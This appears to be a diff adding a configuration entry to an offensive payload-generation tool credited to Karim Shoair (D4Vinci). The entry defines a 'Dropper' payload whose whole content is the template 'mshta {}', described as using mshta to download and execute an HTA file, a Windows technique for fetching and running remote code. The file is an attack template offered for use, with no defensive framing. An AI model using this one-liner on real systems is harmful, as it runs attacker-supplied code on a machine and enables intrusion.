@@ -1,0 +1,7 @@
+[Info]
+Author      = Karim shoair (D4Vinci)
+Description = Uses mshta command to download and execute your hta file.
+
+[Payload]
+Type     = Dropper
+Payload  = mshta {}
